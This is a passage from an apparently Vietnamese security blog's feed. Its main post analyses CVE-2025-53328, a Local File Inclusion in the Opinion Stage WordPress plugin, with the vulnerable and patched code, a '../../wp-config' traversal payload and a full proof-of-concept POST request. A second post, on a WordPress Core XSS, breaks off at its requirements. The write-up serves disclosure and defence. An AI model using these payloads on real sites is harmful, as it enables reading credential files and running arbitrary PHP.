0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_form_current_page() {&#xA;    $view_file_name = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( !empty( $_REQUEST[&amp;#39;page&amp;#39;] ) ) {&#xA;        $qry_str_check_os = sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] );&#xA;        $qry_str_check_os = explode( &amp;#39;-&amp;#39;, $qry_str_check_os );&#xA;        if ( &amp;#39;opinionstage&amp;#39; === $qry_str_check_os[0] ) {&#xA;            $view_file_name = str_replace( &amp;#39;opinionstage-&amp;#39;, &amp;#39;&amp;#39;, sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] ) );&#xA;            $view_file_name = str_replace( &amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $view_file_name );&#xA;        }&#xA;    }&#xA;&#xA;    return $view_file_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;page&lt;/code&gt; param được lấy từ &lt;code&gt;$_REQUEST&lt;/code&gt; do người dùng kiểm soát nhưng &lt;strong&gt;không xác minh hợp lệ của tên file&lt;/strong&gt; =&amp;gt; Cho phép &lt;strong&gt;Local File Inclusion&lt;/strong&gt;. Trong hàm này chỉ có các logic loại bỏ các ký tự HTML bằng &lt;code&gt;sanitize_text_field&lt;/code&gt; và kiểm tra tiền tố &lt;code&gt;opinionstage-&lt;/code&gt; sau đó loại bỏ tiền tố và thay &lt;code&gt;-&lt;/code&gt; bằng &lt;code&gt;_&lt;/code&gt; nên attacker có thể truyền:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;?page=opinionstage-../../wp-config&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_from_current_page() {&#xA;&#xA;    if (empty($_REQUEST[&amp;#39;page&amp;#39;]) || !is_string($_REQUEST[&amp;#39;page&amp;#39;])) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $page = sanitize_text_field($_REQUEST[&amp;#39;page&amp;#39;]);&#xA;&#xA;    if (substr($page, 0, strlen(&amp;#39;opinionstage-&amp;#39;)) !== &amp;#39;opinionstage-&amp;#39;) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $template_name = substr($page, strlen(&amp;#39;opinionstage-&amp;#39;));&#xA;    $template_name = str_replace(&amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $template_name);&#xA;&#xA;    if (!in_array($template_name, self::$allowed_templates, true)) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if (strpos($template_name, &amp;#39;..&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;/&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;\\&amp;#39;) !== false) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $template_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã bổ sung nhiều lớp bảo vệ như kiểm tra kiểu dữ liệu, xác minh prefix &lt;code&gt;&amp;quot;opinionstage-&amp;quot;&lt;/code&gt;, áp dụng whitelist (&lt;code&gt;self::$allowed_templates&lt;/code&gt;), ngăn &lt;strong&gt;traversal&lt;/strong&gt; ký tự nguy hiểm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;prepare_view_file_name_form_current_page()&lt;/code&gt; được gọi từ &lt;code&gt;load_template()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function load_template() {&#xA;    $view_file_name = self::prepare_view_file_name_form_current_page();&#xA;    if ( !$view_file_name ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $os_client_logged_in = Helper::is_user_logged_in();&#xA;    $os_options = Helper::get_opinionstage_option();&#xA;&#xA;    TemplatesViewer::require_template( &amp;#39;admin/views/&amp;#39; . $view_file_name, compact( &amp;#39;os_client_logged_in&amp;#39;, &amp;#39;os_options&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;require_template()&lt;/code&gt; được gọi với đối số  &lt;code&gt;&#39;admin/views/&#39;.$view_file_name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function require_template($template_name, $args = []) {&#xA;    $path = Opinionstage::get_instance()-&amp;gt;plugin_path . $template_name . &amp;#39;.php&amp;#39;;&#xA;&#xA;    if( ! file_exists( $path ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    extract($args);&#xA;    require( $path );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;require()&lt;/code&gt; hàm chính gây &lt;strong&gt;LFI&lt;/strong&gt; được gọi với đối số &lt;code&gt;$path&lt;/code&gt; là giá trị concat từ đường dẫn của plugin (&lt;code&gt;plugin_path&lt;/code&gt;), &lt;code&gt;$template_name&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_menu_page() {&#xA;    if ( function_exists( &amp;#39;add_menu_page&amp;#39; ) ) {&#xA;        $os_client_logged_in = Helper::is_user_logged_in();&#xA;        if ( $os_client_logged_in ) {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_MENU_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;View My Items&amp;#39;, &amp;#39;My Items&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_MENU_SLUG );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        } else {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_GETTING_STARTED_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, &amp;#39;Get Started&amp;#39;, &amp;#39;Get Started&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;register_menu_page()&lt;/code&gt; sẽ register 2 submenu với &lt;code&gt;load_template&lt;/code&gt; làm callback dựa trên trạng thái đăng nhập của người dùng&lt;/p&gt;&#xA;&lt;p&gt;Để truy cập vào &lt;strong&gt;submenu&lt;/strong&gt; của &lt;strong&gt;admin&lt;/strong&gt; người dùng cần phải login vào WordPress với đặc quyền tối thiểu là &lt;strong&gt;Contributor&lt;/strong&gt; =&amp;gt; đặc quyền yêu cầu của CVE này là &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;2 slug được khai báo cho 2 submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string OPINIONSTAGE_MENU_SLUG = &amp;#34;opinionstage-settings&amp;#34;&#xA;const string OPINIONSTAGE_GETTING_STARTED_SLUG = &amp;#34;opinionstage-getting-started&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng tài khoản Contributor&lt;/li&gt;&#xA;&lt;li&gt;Gửi POST request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 28&#xA;&#xA;page=opinionstage-../payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug1.png&#34;&#xA;    alt=&#34;Debug - Giá trị của $view_file_name&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Giá trị của $view_file_name&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug2.png&#34;&#xA;    alt=&#34;Debug - Giá trị của $path được require&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Giá trị của $path được require&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;File &lt;code&gt;payload.php&lt;/code&gt; được tạo để thử nghiệm&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;ABC&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;explain&#34;&gt;&lt;span&gt;Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta tận dụng cách WordPress và Plugin xử lý tham số: WordPress xác định trang quản trị dựa trên &lt;code&gt;page&lt;/code&gt; trong URL, nhưng plugin lại đọc &lt;code&gt;page&lt;/code&gt; từ &lt;code&gt;$_REQUEST&lt;/code&gt; - mà &lt;code&gt;$_REQUEST&lt;/code&gt; sẽ ưu tiên giá trị từ body khi request là POST. Vì vậy ta gửi một POST tới &lt;code&gt;admin.php?page=opinionstage-getting-started&lt;/code&gt; (page hợp lệ trên URL để gọi callback), đồng thời đặt &lt;code&gt;page=opinionstage-../payload&lt;/code&gt; trong body của POST. Kết quả: WordPress chấp nhận URL và gọi callback, còn plugin lấy &lt;code&gt;page&lt;/code&gt; từ &lt;code&gt;$_REQUEST&lt;/code&gt; (body) chứa payload &lt;code&gt;../&lt;/code&gt; — cho phép vượt thư mục và khai thác LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-53328 là LFI do dùng input &lt;code&gt;page&lt;/code&gt; không được kiểm soát để tạo đường dẫn file cho &lt;code&gt;require()&lt;/code&gt; - tiền tố &lt;code&gt;opinionstage-&lt;/code&gt; được chấp nhận nhưng phần sau có thể chứa &lt;code&gt;..&lt;/code&gt; &lt;code&gt;/&lt;/code&gt; &lt;code&gt;\&lt;/code&gt; để vượt thư mục. Bản vá (v19.11.1) thêm kiểm tra kiểu, chặn traversal và &lt;strong&gt;whitelist&lt;/strong&gt; template.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không dùng input user trực tiếp để xây path cho &lt;code&gt;include/require&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Áp dụng &lt;strong&gt;whitelist&lt;/strong&gt; (hoặc mapping) cho tên template.&lt;/li&gt;&#xA;&lt;li&gt;Chặn &lt;code&gt;..&lt;/code&gt;, &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt; hoặc dùng &lt;code&gt;realpath()&lt;/code&gt; so với thư mục gốc.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật plugin lên &lt;strong&gt;19.11.1&lt;/strong&gt; ngay.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/social-polls-by-opinionstage/vulnerability/wordpress-poll-survey-quiz-maker-plugin-by-opinion-stage-plugin-19-11-0-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin &amp;lt;= 19.11.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58674 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-11-cve-2025-58674/</link>
      <pubDate>Sat, 11 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-11-cve-2025-58674/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Stored Cross Site Scripting(XSS)&lt;/strong&gt; xảy ra trên WordPress Core trước phiên bản &lt;code&gt;6.8.3&lt;/code&gt;. Nguyên nhân do sai xử lý đầu vào khi sinh trang web động, tác động đến chức năng tạo menu (&lt;code&gt;nav menus&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58674&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58674&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.8.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.8.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPressCore&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Wordpress Core Versions&lt;/strong&gt;: &lt;strong&gt;v6.8.2&lt;/strong&gt; 